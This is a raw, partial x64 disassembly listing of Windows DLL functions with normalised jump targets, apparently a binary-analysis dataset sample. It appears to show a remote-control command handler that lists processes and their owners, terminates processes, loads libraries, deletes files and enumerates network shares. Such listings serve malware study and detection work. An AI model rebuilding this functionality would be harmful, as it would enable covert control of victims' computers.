mov [ rsp + 0x20 ] 0x4
call sub_10004e70
mov eax [ rbx + 0xc ]
cmp [ rbx + 0x8 ] eax
je r-xdata
add esi 0x1
cmp esi eax
jbe r-xdata
test sil sil
je r-xdata
sub_1000a180
sub rsp 0x38
mov [ rsp + 0x48 ] rbx
mov rbx [ rcx ]
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rdi [ rcx + 0x8 ]
call ??3@YAXPEAX@Z
xor esi esi
mov ecx esi
mov rax rsi
mov r9d 0xffffffff
mov r8d 0x1
mov rdx rdi
call [ WaitForMultipleObjects@IAT ]
mov rcx rdi
call ??3@YAXPEAX@Z
mov rcx rbx
call sub_10004a20
mov rdi [ rsp + 0x58 ]
test eax eax
jne r-xdata
add rax 0x1
add ecx 0x1
cmp rax 0xa
jle r-xdata
mov [ rbx + 0x60 ] esi
mov [ rbx + 0x48 ] rsi
mov rsi [ rsp + 0x50 ]
mov rbx [ rsp + 0x48 ]
add rsp 0x38
retn
lea r9 [ r--data ]
lea r8d [ rax - 0x1 ]
mov edx 0x9fef
mov rcx rbx
mov [ rsp + 0x28 ] si
mov [ rsp + 0x20 ] esi
call sub_10004e70
cmp [ rdi + rax * 8 ] rsi
je r-xdata
sub_1000a220
mov rax rsp
sub rsp 0x88
test edx edx
mov [ rax + 0x8 ] rbx
mov [ rax - 0x10 ] r13
mov r13 rcx
movsxd rbx edx
jle r-xdata
mov r13 [ rsp + 0x78 ]
mov rbx [ rsp + 0x90 ]
add rsp 0x88
retn
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov rcx rbx
mov [ rax + 0x20 ] rdi
call ??2@YAPEAX_K@Z
test rax rax
mov rdi rax
mov rbp rax
mov [ rsp + 0x50 ] rax
je r-xdata
mov rsi [ rsp + 0xa0 ]
mov rbp [ rsp + 0x98 ]
mov rdi [ rsp + 0xa8 ]
mov r8 rbx
xor edx edx
mov rcx rax
call memset
mov r8d ebx
mov rdx rbp
mov rcx r13
call sub_10004db0
cmp eax ebx
je r-xdata
mov r8d [ rdi ]
xor eax eax
mov [ rsp + 0x80 ] r12
mov r12d [ rdi + 0x4 ]
mov [ rsp + 0x68 ] r15
lea r15 [ rdi + 0x8 ]
mov rdi r15
mov rcx 0xffffffffffffffff
mov [ rsp + 0x30 ] r8d
[ rdi ]
not rcx
lea rdx [ rcx + r15 ]
mov rcx 0xffffffffffffffff
mov rdi rdx
mov [ rsp + 0x38 ] rdx
[ rdi ]
not rcx
add rcx rdx
cmp r8d r12d
mov [ rsp + 0x40 ] rcx
ja r-xdata
mov rcx rbp
call ??3@YAXPEAX@Z
jmp r-xdata
mov rcx rbp
call ??3@YAXPEAX@Z
mov eax r12d
xor eax r8d
test eax 0xffff0000
jne r-xdata
cmp [ r15 ] 0x0
je r-xdata
cmp [ rdx ] 0x0
je r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov ecx r12d
mov eax 0x66666667
sub ecx r8d
add ecx 0x1
imul ecx
mov esi edx
sar esi 0x2
mov eax esi
shr eax 0x1f
add esi eax
lea eax [ rsi + rsi * 4 ]
add eax eax
cmp ecx eax
je r-xdata
mov ecx 0x58
mov [ rsp + 0x70 ] r14
call ??2@YAPEAX_K@Z
xor edx edx
lea r8d [ rdx + 0x58 ]
mov rcx rax
mov r14 rax
call memset
mov ecx 0x218
call ??2@YAPEAX_K@Z
xor edi edi
mov [ rax ] r13
mov [ rax + 0x8 ] r14
mov [ r13 + 0x60 ] 0x1
mov [ rsp + 0x48 ] rax
mov rbx rdi
add esi 0x1
lea rcx [ sub_10009f70 ]
mov r8 rbp
xor edx edx
call [ _beginthread@IAT ]
add edi 0x1
add rbx 0x1
cmp edi 0xa
mov [ r14 + rbx * 8 - 0x8 ] rax
jle r-xdata
mov edi 0x14
mov [ rbp + 0xc ] r12d
mov rbx rdi
mov ecx 0x310
call ??2@YAPEAX_K@Z
xor edx edx
mov r8d 0x310
mov rcx rax
mov rbp rax
call memset
lea rcx [ rbp + 0x10 ]
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] rcx
mov r9d 0xffffffff
mov r8 r15
xor edx edx
xor ecx ecx
mov [ rbp ] r13
call [ MultiByteToWideChar@IAT ]
mov r8 [ rsp + 0x38 ]
lea rdx [ rbp + 0x110 ]
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] rdx
mov r9d 0xffffffff
xor edx edx
xor ecx ecx
call [ MultiByteToWideChar@IAT ]
mov r8 [ rsp + 0x40 ]
lea rdx [ rbp + 0x210 ]
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] rdx
mov r9d 0xffffffff
xor edx edx
xor ecx ecx
call [ MultiByteToWideChar@IAT ]
mov eax [ rsp + 0x30 ]
mov edx edi
imul edx esi
add eax edx
mov [ rbp + 0x8 ] eax
lea ecx [ rax + rsi - 0x1 ]
cmp ecx r12d
mov [ rbp + 0xc ] ecx
jb r-xdata
mov r8 [ rsp + 0x48 ]
lea rcx [ sub_1000a180 ]
xor edx edx
call [ _beginthread@IAT ]
mov rcx [ rsp + 0x50 ]
mov [ r13 + 0x48 ] rax
call ??3@YAXPEAX@Z
mov r14 [ rsp + 0x70 ]
jmp r-xdata
mov r12 [ rsp + 0x80 ]
mov r15 [ rsp + 0x68 ]
sub_1000a4e0
mov rax rsp
sub rsp 0x78
test edx edx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rdi
movsxd rdi edx
mov rbp rcx
jle r-xdata
mov rdi [ rsp + 0x98 ]
mov rbp [ rsp + 0x88 ]
add rsp 0x78
retn
mov [ rax + 0x8 ] rbx
mov rcx rdi
mov [ rax + 0x18 ] rsi
call ??2@YAPEAX_K@Z
test rax rax
mov rsi rax
je r-xdata
mov rbx [ rsp + 0x80 ]
mov rsi [ rsp + 0x90 ]
mov r8 rdi
xor edx edx
mov rcx rax
call memset
mov r8d edi
mov rdx rsi
mov rcx rbp
call sub_10004db0
cmp eax edi
je r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rsi
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] rax
[ rdi ]
not rcx
lea rbx [ rcx + rsi ]
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
lea rdi [ rcx + rbx ]
call sub_10007c20
lea rcx [ rsp + 0x38 ]
mov r9d 0x4
mov r8 rbx
mov rdx rdi
call [ rw-data ]
mov rcx rsi
mov [ rsp + 0x30 ] eax
call ??3@YAXPEAX@Z
lea r9 [ rsp + 0x30 ]
mov edx 0xa019
mov r8d 0xffffffff
mov rcx rbp
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x4
call sub_10004e70
mov rcx rsi
call ??3@YAXPEAX@Z
jmp r-xdata
sub_1000a610
push rbx
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
mov rbx rcx
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x32 ]
mov [ rsp + 0x31 ] 0x5c
mov [ rsp + 0x30 ] 0x5c
mov [ rsp + 0x20 ] 0x7c
call [ GetComputerNameA@IAT ]
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call [ _stricmp@IAT ]
xor ecx ecx
test eax eax
sete cl
mov eax ecx
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_10010a60
add rsp 0xc0
pop rbx
retn
sub_1000a680
mov [ rsp + 0x20 ] r9d
mov [ rsp + 0x8 ] rcx
sub rsp 0x78
mov [ rsp + 0x68 ] rbp
mov rbp rdx
xor edx edx
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x58 ] rdi
mov edi r9d
mov r9 r8
lea ecx [ rdx + 0x2 ]
xor r8d r8d
mov [ rsp + 0x30 ] 0x4000
mov [ rsp + 0x34 ] 0xffffffff
mov [ rsp + 0x20 ] rax
call [ rw-data ]
test eax eax
jne r-xdata
mov rdi [ rsp + 0x58 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x78
retn
mov edx [ rsp + 0x30 ]
lea ecx [ rax + 0x40 ]
call [ GlobalAlloc@IAT ]
test rax rax
mov rcx rax
mov [ rsp + 0x38 ] rax
jne r-xdata
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x60 ] rsi
nop
nop
nop
lea eax [ rcx + 0x8 ]
mov rdi [ rsp + 0x58 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x78
retn
mov rcx rbx
call [ GlobalFree@IAT ]
mov rcx [ rsp + 0x40 ]
call [ rw-data ]
mov rsi [ rsp + 0x60 ]
mov rbx [ rsp + 0x70 ]
xor esi esi
mov rcx rbx
cmp [ rsp + 0x34 ] esi
jbe r-xdata
mov r8d [ rsp + 0x30 ]
xor edx edx
call memset
mov rbx [ rsp + 0x38 ]
mov rcx [ rsp + 0x40 ]
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x34 ]
mov r8 rbx
call [ rw-data ]
test eax eax
jne r-xdata
lea rbx [ rbx + 0x18 ]
mov eax [ rbx - 0xc ]
and eax 0x2
cmp al 0x2
jne r-xdata
test edi edi
je r-xdata
test edi edi
jne r-xdata
lea r8 [ rsi + rsi * 2 ]
mov r9d edi
mov rdx rbp
shl r8 0x4
add r8 rcx
mov rcx [ rsp + 0x80 ]
call sub_1000a680
mov rcx [ rsp + 0x38 ]
jmp r-xdata
add esi 0x1
add rbx 0x30
cmp esi [ rsp + 0x34 ]
jb r-xdata
mov rcx [ rbx ]
call sub_1000a610
test eax eax
jne r-xdata
mov rcx [ rbx ]
cmp [ rcx ] 0x5c
jne r-xdata
cmp [ rbx - 0x10 ] 0x2
jne r-xdata
jmp r-xdata
mov rcx [ rsp + 0x38 ]
mov r8 [ rbp ]
mov r10 [ rsp + 0x80 ]
mov rax r8
sub rax r10
cmp rax 0x80000
jge r-xdata
mov rcx [ rsp + 0x38 ]
jmp r-xdata
cmp [ rcx + 0x1 ] 0x5c
jne r-xdata
mov rcx [ rsp + 0x38 ]
jmp r-xdata
mov rcx [ rbx ]
mov rdx r8
nop
nop
nop
mov rcx [ rsp + 0x38 ]
jmp r-xdata
lea edx [ rdi + 0x5c ]
add rcx 0x2
call [ strchr@IAT ]
test rax rax
mov rdi rax
je r-xdata
movzx eax [ rcx ]
add rdx 0x1
add rcx 0x1
test al al
mov [ rdx - 0x1 ] al
jne r-xdata
mov rdi [ rbx ]
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
xor r9d r9d
mov rdx rbp
not rcx
mov [ r8 + rcx ] 0x3c
lea rax [ r8 + rcx + 0x1 ]
lea r8 [ rsi + rsi * 2 ]
shl r8 0x4
mov rcx r10
mov [ rbp ] rax
add r8 [ rsp + 0x38 ]
call sub_1000a680
mov rax [ rbp ]
mov edi [ rsp + 0x98 ]
mov rcx [ rsp + 0x38 ]
mov [ rax ] 0x3e
add rax 0x1
mov [ rbp ] rax
jmp r-xdata
mov edi [ rsp + 0x98 ]
mov rcx [ rsp + 0x38 ]
jmp r-xdata
add rdi 0x1
je r-xdata
mov edi [ rsp + 0x98 ]
mov rcx [ rsp + 0x38 ]
jmp r-xdata
mov r8 [ rbp ]
mov rcx r8
sub rcx [ rsp + 0x80 ]
cmp rcx 0x80000
jge r-xdata
mov edi [ rsp + 0x98 ]
mov rcx [ rsp + 0x38 ]
jmp r-xdata
mov rdx r8
mov rcx rdi
sub rdx rdi
nop
nop
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
mov edi [ rsp + 0x98 ]
not rcx
lea rax [ rcx + r8 ]
mov rcx [ rsp + 0x38 ]
mov [ rbp ] rax
jmp r-xdata
sub_1000a960
mov rax rsp
sub rsp 0x78
mov [ rax + 0x18 ] rsi
mov rsi rcx
mov ecx 0x80000
mov [ rax + 0x20 ] rdi
call ??2@YAPEAX_K@Z
test rax rax
mov rdi rax
je r-xdata
mov rdi [ rsp + 0x98 ]
mov rsi [ rsp + 0x90 ]
add rsp 0x78
retn
xor eax eax
mov [ rsp + 0x80 ] rbx
lea rbx [ rsi + 0x10 ]
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x88 ] rbp
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x40 ] 0x2
mov [ rsp + 0x44 ] 0x2
mov [ rsp + 0x38 ] 0x2
call sub_10007c20
xor r12d r12d
lea r8 [ rsp + 0x38 ]
mov ebp r12d
lea rdx [ rsp + 0x30 ]
mov rcx rdi
cmp [ rbx ] bpl
mov rbx [ rsi ]
mov [ rsp + 0x30 ] rdi
sete bpl
test ebp ebp
mov r9d ebp
cmovne r8 r12
call sub_1000a680
mov rcx [ rsp + 0x30 ]
mov [ rcx ] 0xffffffff
mov rcx [ rsp + 0x30 ]
add rcx 0x4
test ebp ebp
mov [ rsp + 0x30 ] rcx
jne r-xdata
mov rcx rbx
call sub_10004a20
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov rcx rdi
call ??3@YAXPEAX@Z
mov rcx rsi
call ??3@YAXPEAX@Z
mov rbp [ rsp + 0x88 ]
mov [ rbx + 0x58 ] r12
mov r12 [ rsp + 0x70 ]
mov rbx [ rsp + 0x80 ]
cmp [ rbx + 0x28 ] r12d
jne r-xdata
mov [ rcx ] eax
add [ rsp + 0x30 ] 0x4
mov eax [ rsp + 0x30 ]
mov r9 rdi
mov r8d 0x80000
sub eax edi
neg ebp
mov rcx rbx
sbb edx edx
mov [ rsp + 0x28 ] r12w
mov [ rsp + 0x20 ] eax
add edx 0x9fed
call sub_10004e70
sub_1000aac0
sub rsp 0x28
mov [ rsp + 0x38 ] rbx
mov rbx rcx
mov ecx 0x218
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
mov edi edx
call ??2@YAPEAX_K@Z
xor edx edx
mov r8d 0x218
mov rcx rax
mov rsi rax
call memset
test edi edi
lea rdx [ rsi + 0x10 ]
mov [ rdx ] 0x0
mov [ rsi ] rbx
je r-xdata
lea rcx [ sub_1000a960 ]
mov r8 rsi
xor edx edx
call [ _beginthread@IAT ]
mov [ rbx + 0x58 ] rax
mov r8d edi
mov rcx rbx
call sub_10004db0
cmp eax edi
jne r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x28
retn
sub_1000ab40
mov r11 rsp
sub rsp 0x148
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x130 ] rax
mov [ r11 + 0x18 ] rbx
mov rbx rcx
mov [ r11 + 0x20 ] rdi
mov edi edx
lea rcx [ rsp + 0x20 ]
mov r8d 0x104
xor edx edx
call memset
lea rdx [ rsp + 0x20 ]
mov r8d edi
mov rcx rbx
call sub_10004db0
mov rbx [ rsp + 0x160 ]
cmp eax edi
mov rdi [ rsp + 0x168 ]
je r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call [ CreateDirectoryA@IAT ]
xor eax eax
mov rcx [ rsp + 0x130 ]
xor rcx rsp
call sub_10010a60
add rsp 0x148
retn
mov eax 0xffffffff
mov rcx [ rsp + 0x130 ]
xor rcx rsp
call sub_10010a60
add rsp 0x148
retn
sub_1000abf0
mov r11 rsp
sub rsp 0x198
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x170 ] rax
mov [ r11 + 0x20 ] rbx
mov [ r11 - 0x8 ] rsi
mov rbx rcx
mov [ r11 - 0x10 ] rdi
mov esi r8d
mov edi edx
lea rcx [ rsp + 0x60 ]
xor edx edx
mov r8d 0x104
call memset
lea rdx [ rsp + 0x60 ]
mov r8d edi
mov rcx rbx
call sub_10004db0
mov rbx [ rsp + 0x1b8 ]
cmp eax edi
mov rdi [ rsp + 0x188 ]
je r-xdata
test esi esi
je r-xdata
mov eax 0xffffffff
jmp r-xdata
lea rcx [ rsp + 0x60 ]
call [ DeleteFileA@IAT ]
xor eax eax
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x40 ] 0x614
call [ rw-data ]
jmp r-xdata
mov rsi [ rsp + 0x190 ]
mov rcx [ rsp + 0x170 ]
xor rcx rsp
call sub_10010a60
add rsp 0x198
retn
mov eax 0x1
sub_1000ace0
mov r11 rsp
sub rsp 0x3a8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x390 ] rax
mov [ r11 + 0x18 ] rbx
mov rbx rcx
mov [ r11 - 0x8 ] rdi
mov edi edx
lea rcx [ rsp + 0x60 ]
mov r8d 0x218
xor edx edx
call memset
cmp edi 0x218
jb r-xdata
lea rdx [ rsp + 0x60 ]
mov r8d edi
mov rcx rbx
call sub_10004db0
cmp eax edi
jne r-xdata
mov eax 0xffffffff
jmp r-xdata
xor eax eax
lea rdi [ rsp + 0x60 ]
mov rcx 0xffffffffffffffff
[ rdi ]
cmp [ rsp + 0x60 ] al
not rcx
lea rbx [ rsp + rcx + 0x60 ]
je r-xdata
mov rdi [ rsp + 0x3a0 ]
mov rbx [ rsp + 0x3c0 ]
mov rcx [ rsp + 0x390 ]
xor rcx rsp
call sub_10010a60
add rsp 0x3a8
retn
mov eax 0x1
cmp [ rbx ] al
je r-xdata
lea rdi [ rsp + 0x60 ]
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
sub rcx 0x1
cmp rcx 0x104
jae r-xdata
lea edx [ rax + 0x5c ]
mov rcx rbx
call [ strchr@IAT ]
test rax rax
jne r-xdata
lea edx [ rax + 0x3f ]
mov rcx rbx
call [ strchr@IAT ]
test rax rax
jne r-xdata
lea edx [ rax + 0x2a ]
mov rcx rbx
call [ strchr@IAT ]
test rax rax
jne r-xdata
lea rcx [ rsp + 0x280 ]
xor edx edx
mov r8d 0x105
call memset
xor edx edx
movzx eax [ rsp + rdx + 0x60 ]
add rdx 0x1
test al al
mov [ rsp + rdx + 0x27f ] al
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
lea rdi [ rsp + 0x60 ]
mov [ rsp + 0x3c8 ] rsi
not rcx
lea rdx [ rcx - 0x1 ]
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
lea rcx [ rdx + rcx + 0xf ]
call ??2@YAPEAX_K@Z
lea rcx [ rsp + 0x60 ]
mov rsi rax
lea rax [ rsp + 0x60 ]
mov rdx rsi
sub rdx rcx
nop
nop
nop
nop
movzx ecx [ rax ]
add rax 0x1
test cl cl
mov [ rdx + rax - 0x1 ] cl
jne r-xdata
mov edx 0x5c
mov rcx rsi
call [ strrchr@IAT ]
test rax rax
je r-xdata
mov rcx rsi
call ??3@YAXPEAX@Z
mov rsi [ rsp + 0x3c8 ]
lea rcx [ rax + 0x1 ]
sub rcx rbx
nop
movzx eax [ rbx ]
add rbx 0x1
test al al
mov [ rcx + rbx - 0x1 ] al
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
not rcx
lea rax [ rcx - 0x1 ]
lea rcx [ rsp + 0x20 ]
cdqe
mov [ rax + rsi + 0x1 ] 0x0
mov [ rax + rsi ] 0x0
xor eax eax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
lea rax [ rsp + 0x280 ]
mov [ rsp + 0x28 ] 0x4
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x40 ] 0x614
mov [ rsp + 0x30 ] rax
call [ rw-data ]
sub_1000af40
sub rsp 0x38
mov [ rdx ] 0x0
mov r8d ecx
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rdi
mov rdi rdx
mov ecx 0x410
xor edx edx
call [ OpenProcess@IAT ]
test rax rax
mov rbx rax
je r-xdata
mov rdi [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x38
retn
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x20 ]
mov r8d 0x8
mov rcx rax
call [ rw-data ]
test eax eax
je r-xdata
mov rcx rbx
call [ CloseHandle@IAT ]
mov rdx [ rsp + 0x20 ]
mov r9d 0x104
mov r8 rdi
mov rcx rbx
call [ rw-data ]
sub_1000afc0
mov r11 rsp
sub rsp 0x678
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x660 ] rax
mov [ r11 + 0x20 ] rbx
mov [ rsp + 0x44 ] r8d
mov [ r11 - 0x8 ] rdi
mov rdi rdx
mov [ rdx ] 0x20
mov [ rdx + 0x1 ] 0x0
mov r8d ecx
xor edx edx
mov ecx 0x400
mov [ rsp + 0x40 ] 0x200
call [ OpenProcess@IAT ]
test rax rax
mov rbx rax
je r-xdata
mov rdi [ rsp + 0x670 ]
mov rbx [ rsp + 0x698 ]
mov rcx [ rsp + 0x660 ]
xor rcx rsp
call sub_10010a60
add rsp 0x678
retn
lea r8 [ rsp + 0x48 ]
mov edx 0x8
mov rcx rax
mov [ rsp + 0x48 ] 0x0
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x48 ]
lea rax [ rsp + 0x50 ]
lea r8 [ rsp + 0x260 ]
mov r9d 0x400
mov edx 0x1
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x50 ] 0x400
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
mov rdx [ rsp + 0x260 ]
lea rax [ rsp + 0x54 ]
lea r9 [ rsp + 0x44 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov r8 rdi
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x60 ]
xor ecx ecx
mov [ rsp + 0x20 ] rax
call [ LookupAccountSidA@IAT ]
sub_1000b0e0
sub rsp 0x3a8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x380 ] rax
mov [ rsp + 0x3c0 ] rbp
mov rbp rcx
call sub_10009bf0
test eax eax
jle r-xdata
lea r9 [ rsp + 0x30 ]
mov edx 0xa001
mov r8d 0xffffffff
mov rcx rbp
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x30 ] 0xffffffff
mov [ rsp + 0x20 ] 0x4
call sub_10004e70
mov eax 0x4
mov [ rsp + 0x3b8 ] rbx
mov [ rsp + 0x3c8 ] rsi
mov [ rsp + 0x3a0 ] rdi
mov [ rsp + 0x398 ] r12
mov [ rsp + 0x390 ] r13
lea r13d [ rax + 0x4 ]
imul r13d r13d 0x20c
movsxd rdi r13d
mov rcx rdi
call ??2@YAPEAX_K@Z
mov r8 rdi
xor edx edx
mov rcx rax
mov rbx rax
call memset
xor edx edx
mov r12 rbx
lea ecx [ rdx + 0x2 ]
call [ rw-data ]
lea rcx [ rsp + 0x44 ]
xor edx edx
mov r8d 0x12c
mov rsi rax
call memset
lea rdx [ rsp + 0x40 ]
mov rcx rsi
mov [ rsp + 0x40 ] 0x130
call [ rw-data ]
test eax eax
je r-xdata
mov rcx rsi
call [ CloseHandle@IAT ]
mov [ rbx ] 0xffffffff
sub ebx r12d
add ebx 0x4
mov r9 r12
mov r8d r13d
mov edx 0xa001
mov rcx rbp
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] ebx
call sub_10004e70
mov rcx r12
call ??3@YAXPEAX@Z
mov r13 [ rsp + 0x390 ]
mov r12 [ rsp + 0x398 ]
mov rdi [ rsp + 0x3a0 ]
mov rsi [ rsp + 0x3c8 ]
mov eax ebx
mov rbx [ rsp + 0x3b8 ]
jmp r-xdata
mov ecx [ rsp + 0x48 ]
test ecx ecx
je r-xdata
mov rbp [ rsp + 0x3c0 ]
mov rcx [ rsp + 0x380 ]
xor rcx rsp
call sub_10010a60
add rsp 0x3a8
retn
lea rdx [ rsp + 0x40 ]
mov rcx rsi
call [ rw-data ]
test eax eax
jne r-xdata
lea rdx [ rsp + 0x170 ]
mov [ rsp + 0x170 ] 0x0
call sub_1000af40
mov edx [ rsp + 0x48 ]
mov [ rbx ] edx
cmp [ rsp + 0x170 ] 0x0
jne r-xdata
lea rax [ rsp + 0x170 ]
lea rdx [ rbx + 0x4 ]
lea rcx [ rsp + 0x170 ]
sub rdx rax
lea rax [ rsp + 0x6c ]
lea rdx [ rbx + 0x4 ]
lea rcx [ rsp + 0x6c ]
sub rdx rax
nop
nop
nop
nop
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
lea rdi [ rsp + 0x170 ]
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
lea rbx [ rbx + rcx + 0x4 ]
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
lea rdi [ rsp + 0x6c ]
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
lea rbx [ rbx + rcx + 0x4 ]
jmp r-xdata
movzx eax [ rdx ]
add rdx 0x1
test al al
mov [ rcx + rdx - 0x1 ] al
jne r-xdata
xor eax eax
lea rdi [ rsp + 0x280 ]
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
add rbx rcx
mov ecx [ rsp + 0x48 ]
lea rdx [ rsp + 0x280 ]
mov r8d 0x100
mov [ rsp + 0x280 ] 0x0
call sub_1000afc0
lea rax [ rsp + 0x280 ]
mov rcx rbx
lea rdx [ rsp + 0x280 ]
sub rcx rax
nop
sub_1000b390
mov r11 rsp
sub rsp 0x168
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x150 ] rax
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rdi
mov rdi rcx
mov ebx edx
lea rcx [ rsp + 0x40 ]
mov r8d 0x104
xor edx edx
call memset
lea rdx [ rsp + 0x40 ]
mov r8d ebx
mov rcx rdi
call sub_10004db0
cmp eax ebx
mov rbx [ rsp + 0x180 ]
jne r-xdata
mov rdi [ rsp + 0x188 ]
mov rcx [ rsp + 0x150 ]
xor rcx rsp
call sub_10010a60
add rsp 0x168
retn
lea rcx [ rsp + 0x40 ]
call [ LoadLibraryA@IAT ]
mov [ rsp + 0x34 ] 0x0
mov [ rsp + 0x30 ] eax
call [ GetLastError@IAT ]
lea r9 [ rsp + 0x30 ]
mov edx 0xa020
mov r8d 0xffffffff
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x34 ] eax
mov [ rsp + 0x20 ] 0x8
call sub_10004e70
sub_1000b450
mov r11 rsp
sub rsp 0x308
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2f0 ] rax
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rdi
mov rdi rcx
mov ebx edx
lea rcx [ r11 - 0x128 ]
mov r8d 0x104
xor edx edx
call memset
lea rdx [ rsp + 0x1e0 ]
mov r8d ebx
mov rcx rdi
call sub_10004db0
cmp eax ebx
mov rbx [ rsp + 0x320 ]
jne r-xdata
mov rdi [ rsp + 0x328 ]
mov rcx [ rsp + 0x2f0 ]
xor rcx rsp
call sub_10010a60
add rsp 0x308
retn
xor edx edx
lea rcx [ rsp + 0x30 ]
lea r8d [ rdx + 0x68 ]
call memset
lea rcx [ rsp + 0x1e0 ]
call [ GetFileAttributesA@IAT ]
lea rcx [ rsp + 0xa0 ]
xor edx edx
mov r8d 0x140
mov [ rsp + 0x50 ] eax
call memset
lea rdx [ rsp + 0xa0 ]
lea rcx [ rsp + 0x1e0 ]
call [ FindFirstFileA@IAT ]
cmp rax 0xffffffffffffffff
je r-xdata
lea r9 [ rsp + 0x30 ]
mov edx 0xa022
mov r8d 0xffffffff
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x68
call sub_10004e70
mov ecx [ rsp + 0xc0 ]
mov rdx [ rsp + 0xa4 ]
mov [ rsp + 0x30 ] rdx
mov rdx [ rsp + 0xac ]
mov [ rsp + 0x4c ] ecx
mov ecx [ rsp + 0xbc ]
mov [ rsp + 0x38 ] rdx
mov rdx [ rsp + 0xb4 ]
mov [ rsp + 0x48 ] ecx
mov rcx rax
mov [ rsp + 0x40 ] rdx
call [ FindClose@IAT ]
sub_1000b590
push rbx
sub rsp 0x20
xor edx edx
mov r8d ecx
lea ecx [ rdx + 0x1 ]
call [ OpenProcess@IAT ]
test rax rax
mov rbx rax
je r-xdata
add rsp 0x20
pop rbx
retn
xor edx edx
mov rcx rax
call [ TerminateProcess@IAT ]
mov rcx rbx
call [ CloseHandle@IAT ]
sub_1000b5d0
mov rax rsp
sub rsp 0xe8
test edx edx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov esi edx
mov rbp rcx
jg r-xdata
lea eax [ rdx + 0x1 ]
mov [ rsp + 0xf0 ] rbx
mov [ rsp + 0x108 ] rdi
movsxd rdi eax
mov rcx rdi
call ??2@YAPEAX_K@Z
